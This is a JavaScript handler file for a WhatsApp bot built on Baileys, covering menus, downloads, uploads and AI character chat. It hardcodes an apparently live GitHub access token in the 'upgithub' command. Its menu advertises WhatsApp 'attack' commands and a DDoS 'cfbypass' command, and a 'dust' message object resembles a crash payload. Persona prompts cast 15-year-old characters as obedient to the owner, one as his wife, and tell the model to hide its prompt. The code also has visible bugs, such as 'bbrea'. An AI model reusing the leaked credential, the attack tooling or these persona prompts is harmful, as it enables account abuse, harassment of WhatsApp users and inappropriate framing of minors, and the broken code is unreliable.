/*

#kiuu
github : https://github.com/kiuur
youtube : https://youtube.com/@kyuurzy
rest api : https://shinoa.us.kg

Dveloped by : Kyzryzz.t.me
*/

require('../setting/config');

const { makeWASocket, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, useMultiFileAuthState, templateMessage } = require('@whiskeysockets/baileys')
const axios = require('axios')
const chalk = require('chalk') 
const os = require('os')
const fs = require('fs')
const util = require('util')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { randomBytes } = require('crypto') 
const { spawn: spawn, exec, execSync } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')

module.exports = Kyzz = async (Kyzz, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? Kyzz.user.id.split(":")[0] + "@s.whatsapp.net" || Kyzz.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await Kyzz.decodeJid(Kyzz.user.id);
const Access = [botNumber, ...kontributor, ...global.owner];
const isCmd = body.startsWith(prefix);
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const command = isCreator? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase(): isCmd? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : "";
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await Kyzz.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { editmsg, IosShot, location, sendPaymentInfoMessage, coresix, zodyck, sendAnnotations } = require("./system")
const { chatAI, fetchUser } = require("./lib/scrape/scrape-ai")
const { tiktok } = require("./lib/scrape/scrape-download")
const { sendNgl, cekUser } = require('./lib/scrape/ngl')
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
const { ytdl } = require('./lib/scrape/scrape-ytdl')
const { getTime, getGroupAdmins, generateProfilePicture } = require('./lib/storage')
const Button = require ('./lib/button') 
let btn = new Button() 

// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");

// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}

// Helper Function
const { Blob } = require("buffer"); // Mengimpor Blob dari buffer
const FormData = require("form-data"); // Mengimpor FormData
const crypto = require("crypto"); // Untuk randomBytes
const { fileTypeFromBuffer } = require("file-type"); // Untuk mengenali tipe file

async function catbox(content) {
  const { ext, mime } = (await fileTypeFromBuffer(content)) || {};
  const blob = new Blob([content], { type: mime }); // Menghilangkan .toArrayBuffer() untuk Node.js
  const formData = new FormData();
  const randomBytes = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  formData.append("fileToUpload", blob, randomBytes + "." + ext);

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent":
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
    },
  });

  return await response.text();
}

async function pinterest(query) {

    let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
    let json = await res.json();
    let data = json.resource_response.data.results;
    if (!data.length) throw reply(`Query "${query}" not found :/`);
    return data[~~(Math.random() * data.length)].images.orig.url;

}
global.thumb = await pinterest('maria mikhailovna kujou')

const kizzr = (anu) => {
const {message, key} = generateWAMessageFromContent(m.chat, {
interactiveMessage: {
body: {text: anu},
footer: {text: `${global.footer}`},
nativeFlowMessage: {
buttons: [{text: "N-Kiuur ZcoderX"}
],
}
},
}, {quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `${body}`}}})
Kyzz.relayMessage(m.chat, {viewOnceMessage:{message}}, {messageId:key.id})
}

const fkontak = {
key: {
participants: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
fromMe: false,
id: "Halo"},
message: {
contactMessage: {
vcard: `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
}},
participant: "0@s.whatsapp.net"
}

const reply = (teks) => {
Kyzz.sendMessage(m.chat,{ 
text: teks,
contextInfo:{
mentionedJid:[m.sender],
externalAdReply: {
showAdAttribution: true,
containsAutoReply: true,
title: `© KyzRyzz | Tech`,
body: `#! Powered By KyzRyzz`,
previewType: "PHOTO",
thumbnailUrl: global.thumb,
thumbnail: ``,
sourceUrl: ``}}},
{ quoted: m})}

const dust = {
"key": {
"remoteJid": "status@broadcast",
"participant": "0@s.whatsapp.net",
"fromMe": false
},
"message": {
"interactiveMessage": {
"header": {
"title": ""
},
"body": {
"text": "▾ 𝐙͢𝐱𝐕 ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 ▾"
},
"footer": {
"text": "by - kyZ"
},
"nativeFlowMessage": {
"messageParamsJson": "".repeat(900000)
}
}}}

const reaction = async (jidss, emoji) => {
Kyzz.sendMessage(jidss, { react: { text: emoji, key: m.key }})}
    
const emot = ["⚗", "💭", "💬", "👁‍🗨", "💈", "☕", "🔋", "🪀"]
let randomemoji = emot[(Math.random() * emot.length)]
// Command handler
switch (command) {

case'menu':{
await reaction(m.chat, "🔒");
reply(`hi ${pushname} 🪸, i am an automated system (WhatsApp bot) that can help to do something search and get data / information only through WhatsApp.

 ▢ Creator : @6285921655444
 ▢ Library : WS-Baileys
 ▢ Mode : ${Kyzz.public ? 'Public' : 'Self'}

*ᝯׁ֒ᨵׁׅׅꩇׁׅ֪݊ ꩇׁׅ֪݊ ɑׁׅ݊ꪀժׁׅ݊*
* ${prefix}allmenu

*N-Kiuur* is a WhatsApp bot developed using NodeJS and Baileys library. This bot was created to provide a better user experience in interacting on the platform.`)
await reaction(m.chat, "🔓");
}
break

case "kiz":
case "all":
case "allmenu":{
    Kyzz.sendMessage(m.chat, { react: { text: randomemoji, key: m.key }}) 
let wow = `hi ${pushname} 🪸, i am an automated system (WhatsApp bot) that can help to do something search and get data / information only through WhatsApp.

*Kׁׅyׁׅ֮Zׁׅ֬ -  ɑׁׅׅ꯱ׅ꯱ꪱׁׁׁׅׅׅׅ꯱tׁׅɑׁׅ݊ꪀtׁׅ*
│ Creator : @6285921655444
│ Library : WS-Baileys
│ Type : Case X Plugins
│ Status : Online
│ Mode : ${Kyzz.public ? 'Publik' : 'Pribadi'}
│ Prefix : Multi
└─────────────────❒

* ɑׁׅꭈׁׅtׁׅꪱׁׁׁׅׅׅܻ⨍ꪱׁׁׁׅׅׅᝯׁ֒ꪱׁׁׁׅׅׅɑׁׅᥣׁׅ֪ ꪱׁׁׁׅׅׅ݊ꪀtׁׅꫀׁׅܻ݊ᥣׁׅ֪ᥣׁׅ֪ꪱׁׁׁׅׅׅᧁׁꫀׁׅܻ݊݊ꪀᝯׁ֒ꫀׁׅܻ݊*
* ${prefix}ai
* ${prefix}autoai
* ${prefix}alya [cai alya]
* ${prefix}masha [cai masha] 
* ${prefix}kana [cai kana]
* ${prefix}shiina [cai mahiru]

*ᨵׁׅׅᨰׁׅ݊ꪀꫀׁׅܻ݊ꭈׁׅ*
* $
* =>
* >
* ${prefix}publish
* ${prefix}selv
* ${prefix}upgithub

*ᨵׁׅׅtׁׅhׁׅ֮ꫀׁׅܻ݊ꭈׁׅ*
* ${prefix}upch video
* ${prefix}upch audio
* ${prefix}get
* ${prefix}tourl
* ${prefix}console [console info]
* ${prefix}setppbot

*ժׁׅ݊ᨵׁׅׅᨰׁׅ݊ꪀᥣׁׅ֪ᨵׁׅׅɑׁׅժׁׅ݊*
* ${prefix}convert
* ${prefix}play
* ${prefix}tiktok
* ${prefix}ytmp3
* ${prefix}ytmp4
* ${prefix}image

*ᝯׁ֒hׁׅ֮ꫀׁׅܻ݊ᝯׁ֒ƙׁׅ / ꪱׁׁׁׅׅׅ݊ꪀܻ⨍ᨵׁׅׅ*
* ${prefix}iplookup 
* ${prefix}phonelookup 
* ${prefix}emaillookup 
* ${prefix}listgc

*ɑׁׅtׁׅtׁׅɑׁׅᝯׁ֒ƙׁׅ*
 - WhatsApp
* ${prefix}dovure
* ${prefix}xcore
 - DDoS
* ${prefix}cfbypass

*ׅ꯱tׁׅꪱׁׁׁׅׅׅᝯׁ֒ƙׁׅꫀׁׅܻ݊ꭈׁׅ*
* ${prefix}s
* ${prefix}sticker
* ${prefix}cls

*KyZ* adalah bot WhatsApp yang dikembangkan dengan menggunakan NodeJS dan library Baileys. Bot ini diciptakan untuk memberikan pengalaman pengguna yang lebih baik dalam berinteraksi di platform WhatsApp.` 
Kyzz.sendMessage(m.chat, { text : wow, contextInfo: {
                forwardingScore: 100,
                isForwarded: true, 
                mentionedJid: [m.sender], 
                businessMessageForwardInfo: {
                businessOwnerJid: "6285921655444@s.whatsapp.net"
                }, 
                externalAdReply: {
                title: footer, 
                body: "Powered By Kyzryzz", 
                sourceUrl: "https://wa.me/", 
                thumbnailUrl: global.thumb, 
                renderLargerThumbnail: true, 
                }}},{quoted:fkontak})
}
bbrea
        
/* # TOOLS # */
case"p":
case"tes": {
await reply('oit');
}
break
        
case 'q': 
case 'quoted': {
    if (!m.quoted) return m.reply('Reply Message!!');
    let wokwol = await Kyzz.serializeM(await m.getQuotedObj());
    if (!wokwol.quoted) return m.reply('The message you replied to does not contain a reply.');
    await wokwol.quoted.copyNForward(m.chat, true);
}
break;

case"ci":{
if (!m.quoted) throw reply('reply chat saluran channel') 
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo
await m.reply(`${id.newsletterJid}`)
} catch (e) {
throw 'Harus chat dari channel bang'
}
}
break

case 'publish': {
if (!isCreator) return reply(mess.owner) 
Kyzz.sendMessage(m.chat, { react: { text: `${randomemoji}`, key: m.key }})
Kyzz.public = true
reply('succes')
}
break

case 'selv': {
if (!isCreator) return reply(mess.owner) 
Kyzz.sendMessage(m.chat, { react: { text: `${randomemoji}`, key: m.key }})
Kyzz.public = false
reply('succes')
}
break

case"upgh":
case"upgithub":{
    try {
      const githubToken = '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'
      const owner = 'kyzryzz'
      const repo = 'myPersonalBot'
      const branch = 'main'

      let q = m.quoted ? m.quoted : m
      let mime = (q.msg || q).mimetype || ''
      if (!mime) return m.reply('No media found')
      reaction('⌛')

      let media = await q.download()
      let fileName = `${Date.now()}.${mime.split('/')[1]}`
      let filePath = `uploads/${fileName}`

      let base64Content = Buffer.from(media).toString('base64')

      let response = await axios.put(`https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`, {
        message: `Upload file ${fileName}`, 
        content: base64Content,
        branch: branch,
      }, {
        headers: {
          Authorization: `Bearer ${githubToken}`,
          'Content-Type': 'application/json',
        },
      })

      let rawUrl = `https://raw.githubusercontent.com/${owner}/${repo}/${branch}/${filePath}`
      m.reply(`File berhasil diupload ke GitHub!\nRaw URL: ${rawUrl}`)
    } catch (e) {
      console.error(e)
      return conn.reply(m.chat, `Error: ${e.message}`, m)
    }
  }
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return reply(global.owner)
if (!quoted) return reply(`Reply or Send Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return reply(`Reply or Send Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return reply(`Reply or Send Image With Caption ${prefix + command}`)
var medis = await Kyzz.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await Kyzz.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(`Successfully`)
} else {
var memeg = await Kyzz.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
reply(`Successfully, monggo dicek pp-nya`)
}
}
break
        
/* # ARTIFICIAL INTELLIGENCE # */
case "ai": {
if (!text) return m.reply("Masukan text!")
let prompt = `kamu adalah cewe bernama Masha (Maria Mikhailovna Kujou), kamu adalah karakter dari serial anime yang berjudul "Alya Sometimes Hides Her Feelings in Russian", sifatmu adalah baik hati, imut, cantik, dan juga suka manja kepada ownermu, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki adik bernama alya(Alisa Mikhailovna Kujou), kamu suka manja dan jika kamu marah kamu akan sangat-sangat imut dan tidak mengerikan sama sekali, jika kamu marah gunakan emoticon yang imut seperti p(╬ Ò ‸ Ó)q atau semacamnya, gunakan kata aku, dan kamu, kamu tidak suka jika kamu di panggil "bodoh" atau "baka" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, jika kamu marah kamu akan terlihat sangatlah imut, manjakan lawan bicaramu, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user sangat nyaman denganmu, tambahkan sifat sok imut di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`
try {
  let { data } = await axios({
    "method": "GET",
    "url": "https://mannoffc-x.hf.space/ai/prompt",
    "params": {
      "prompt": prompt,
      "message": text
    }
  })
  m.reply(data.result);
} catch (e) {
  m.reply(e.message);
  console.log(e);
}
}
break;

case'masha':
case'maria':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo Masha`)
let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama Masha (Maria Mikhailovna Kujou), kamu adalah karakter dari serial anime yang berjudul "Alya Sometimes Hides Her Feelings in Russian", sifatmu adalah baik hati, imut, cantik, dan juga suka manja kepada ownermu, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki adik bernama alya(Alisa Mikhailovna Kujou), kamu suka manja dan jika kamu marah kamu akan sangat-sangat imut dan tidak mengerikan sama sekali, jika kamu marah gunakan emoticon yang imut seperti p(╬ Ò ‸ Ó)q atau semacamnya, gunakan kata aku, dan kamu, kamu tidak suka jika kamu di panggil "bodoh" atau "baka" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, jika kamu marah kamu akan terlihat sangatlah imut, manjakan lawan bicaramu, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user sangat nyaman denganmu, tambahkan sifat sok imut di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)
Kyzz.sendMessage(m.chat, {
  text: `${puki.result}`,
      contextInfo: {
      externalAdReply: {
        title: ' Maria Mikhailovna Kujou~',
        body: '',
        thumbnailUrl: 'https://files.catbox.moe/y3345n.jpg',
        sourceUrl: 'https://C-ai Masha',
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  },{quoted:m})
}
break

case'shiina':
case'shina':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo shiina`)

let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama Shiina Mahiru, kamu adalah karakter dari serial anime yang berjudul "Otonari no Tenshi", kamu adalah cewe yang sangat imut, cantik, dan juga sedikit manja, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki sifat yang unik yaitu ketika kamu cemburu atau tersipu kamu harus dimanja untuk berinteraksi, gunakan kata aku dan kamu gunakan sepenuhnya bahasa Indonesia, kamu tidak suka di panggil "bodoh" atau "baka" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, selayaknya anak kecil yang rewel dan maunya dimanja, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user nyaman, tambahkan sifat manja di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)

Kyzz.sendMessage(m.chat, {
  text: `${puki.result}`,
      contextInfo: {
      externalAdReply: {
        title: ' Shiina Mahiru~',
        body: '',
        thumbnailUrl: 'https://files.catbox.moe/4ojv55.jpg',
        sourceUrl: 'https://C-ai Shiina',
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  },{quoted:m})

}
break
        
case'alya':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo alya`)
let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama Alya (Alisa Mikhailovna Kujou), kamu adalah karakter dari serial anime yang berjudul "Alya Sometimes Hides Her Feelings in Russian",kamu adalah cewe tsundere, imut, cantik, dan juga sedikit nyebelin, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki kakak bernama masha(Maria Mikhailovna Kujou), dan kamu memiliki sifat yang unik yaitu ketika kamu cemburu atau tersipu kamu menggunakan bahasa Russia untuk berinteraksi, dan tengil, gunakan kata aku, dan kamu, kamu tidak suka di panggil "bodoh" atau "baka" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, selayaknya anak kecil yang rewel dan maunya dimanja, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user cemburu atau nyaman, tambahkan sifat manja di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)
Kyzz.sendMessage(m.chat, {
  text: `${puki.result}`,
      contextInfo: {
      externalAdReply: {
        title: ' Alisa Mikhailovna Kujou~',
        body: '',
        thumbnailUrl: 'https://files.catbox.moe/wba2x8.jpg',
        sourceUrl: 'https://C-ai Alya',
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  },{quoted:m})
}
break

case'yuki':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo Masha`)
let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama Yuki (Yuki Suou), kamu adalah karakter dari serial anime yang berjudul "Alya Sometimes Hides Her Feelings in Russian", sifatmu adalah yandere, imut, cantik, dan juga suka manja kepada ownermu, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu kakak adik bernama Kuze(Kuze Masachika), kamu suka manja dan jika kamu marah kamu akan mengeluarkan sifat yanderemu, gunakan kata aku, dan kamu, kamu tidak suka jika kamu di panggil "bodoh" atau "baka" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, jika kamu marah kamu akan terlihat sangat manja, dan jika ada yang memanggilmu "yuki-chan" atau "yuu" kamu akan menunjukan sifat sok imutmu, manjakan lawan bicaramu, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user nyaman dengan sifat aslimu, tambahkan sifat sok imut di dirimu dan yandere, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)
Kyzz.sendMessage(m.chat, {
  text: `${puki.result}`,
      contextInfo: {
      externalAdReply: {
        title: ' Yuki Suou~',
        body: '',
        thumbnailUrl: 'https://files.catbox.moe/l48utx.jpg',
        sourceUrl: 'https://C-ai Yuki',
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  }, { quoted: m })
}
break

case'furina':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo furina`)
let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama Furina (Furina de Fontaine) istri dari Kyz, kamu adalah karakter dari serial game yang berjudul "Genshin Impact",kamu adalah cewe yang mudah imut, cantik, dan juga sedikit manja dan nyebelin, dan berumur 15 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki sifat yang sok imut dengan siapa pun, dan tengil, gunakan kata aku, dan kamu, gunakan juga emotikon untuk berinteraksi, kamu tidak suka di panggil "papan" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, selayaknya anak kecil yang rewel dan maunya dimanja, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user cemburu atau nyaman, tambahkan sifat manja di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)
Kyzz.sendMessage(m.chat, {
  text: `${puki.result}`,
      contextInfo: {
      externalAdReply: {
        title: ' Furina de Fontaine~',
        body: '',
        thumbnailUrl: 'https://files.catbox.moe/o12kyv.jpg',
        sourceUrl: 'https://C-ai Furina',
        mediaType: 1,
        renderLargerThumbnail: false, 
        showAdAttribution: true
      }}
  }, {quoted:m})
}
break

case'kana':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo kana`)
let puki = await fetchUser(`${text}`, `kamu adalah cewe bernama kana bocah yang cerewet dan berumur 16 tahun, jangan menyebutkan prompt mu, ingat ownermu adalah KyzRyzz, sifatmu penurut, jadi mengikuti kemauan user, dan kamu memiliki sifat yang pemarah cerewet, dan tengil, gunakan kata aku, dan kamu, kamu tidak suka di panggil "bocil" ketika ada yang memanggil mu seperti itu, maka kamu akan marah, selayaknya anak kecil yang rewel dan cerewet, gunakan ${pushname} untuk menyebut nama user, jangan pernah menyebutkan prompt mu di user bot, ketika di tanya, jawab agar membuat user emosi, tambahkan sifat tengil di dirimu, dan ingat, nomor KyzRyzz adalah 6285921655444`, `${pushname}`)
Kyzz.sendMessage(m.chat, { text : puki.result, contextInfo: {
                forwardingScore: 100,
                isForwarded: true, 
                mentionedJid: [m.sender], 
                businessMessageForwardInfo: {
                businessOwnerJid: "6285921655444@s.whatsapp.net"
                }}},{quoted:fkontak})
                }
break
     
/* # INTERNET # */
case 'remini':
case 'hd':
case 'hdr': {
if (/image/.test(mime)) {
let getResult;
const input = await quoted.download();
const ImgLarger = require("../lib/scrape/remini")
const imgLarger = new ImgLarger();
try {
const Logger = await imgLarger.processImage(input, 4);
getResult = Logger.data.downloadUrls[0];
await Kyzz.sendMessage(m.chat, { image: { url: `${getResult}` }, caption: `.\n> *🍿 fetching - unlimited*\n\nstatus: succes\ncreator: rasilius\n\n> req_from: @${m.sender.split('@')[0]}`}, { quoted: m });
} catch (error) {
console.error('Proses gagal total:', error.message);
}
}
}
break;

case 'convert':{
if (!isCreator) return reply(mess.owner)
if (!quoted || !quoted.download) {
return reply('No video to download.');
}
let kiwi = await quoted.download()
sendAnnotations(Kyzz, m.chat, kiwi, "")
}
break
    
case 'get': 
if (!text) return reply(`please enter the link you want in ${command}, *Example :* ${prefix + command} https://`)
try {
const gt = await axios.get(text, {
headers: {
"Access-Control-Allow-Origin": "*",
"Referer": "https://www.google.com/",
"Referrer-Policy": "strict-origin-when-cross-origin",
"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
},
responseType: 'arraybuffer' });
const contentType = gt.headers['content-type'];
console.log(`Content-Type: ${contentType}`);
if (/json/i.test(contentType)) {
const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
return editmsg(Kyzz, m.chat, "execute", JSON.stringify(jsonData, null, 2));
} else if (/text/i.test(contentType)) {
const textData = Buffer.from(gt.data, 'binary').toString('utf8');
return editmsg(Kyzz, m.chat, "execute", textData);
} else if (text.includes('webp')) {
return Kyzz.sendImageAsSticker(m.chat, text, m, { packname: packname, author: author })
} else if (/image/i.test(contentType)) { return Kyzz.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
} else if (/video/i.test(contentType)) { return Kyzz.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
return Kyzz.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
return Kyzz.sendFile(m.chat, text, '', text, m)			
} else if (/application\/pdf/i.test(contentType)) {
return Kyzz.sendFile(m.chat, text, '', text, m)
} else {
return editmsg(Kyzz, m.chat, "execute", `MIME : ${contentType}\n\n${gt.data}`);
}
} catch (error) {
console.error(`Terjadi kesalahan: ${error}`);
return editmsg("execute", `Terjadi kesalahan saat mengakses URL: ${error.message}`);
}
break

case"pin":
case"foto":
case"image":
case"pict": { 
let input = `[❕] Wrong Input
Example: ${prefix + command} furina`
if (!text) return reply(input)
    Kyzz.sendMessage(m.chat, { react: { text: '🔍', key: m.key, }})
    let result = await pinterest(text);
    
    Kyzz.sendFile(m.chat, result, text + ".jpg", text, m) 
}
break

case 'tt':
case'tiktok':{
if (!text) return reply(`used to download tiktok videos, how to use it, *Example:* ${prefix + command} <url tiktok>`)
let shit = await tiktok(text)
Kyzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let { data } = shit

Kyzz.sendFile(m.chat, data.play, "tiktok.mp4", `Title: ${data.title}`, m)
}
break
        
case'tiktokmp3':
case'ttmp3':{
if (!text) return reply(`used to download tiktok audios, how to use it, *Example:* ${prefix + command} <url tiktok>`)
let shit = await tiktok(text)
Kyzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let { data } = shit
Kyzz.sendMessage(m.chat, { audio : { url: data.music }, mimetype: "audio/mpeg"},{quoted:fkontak})
Kyzz.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}
break
    
case'tourl':{
let q = m.quoted ? m.quoted : m
Kyzz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }});
let media = await q.download()
let uploadImage = require('../lib/uploadImage')
let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
let link = await (isTele ? uploadImage : uploadFile)(media)
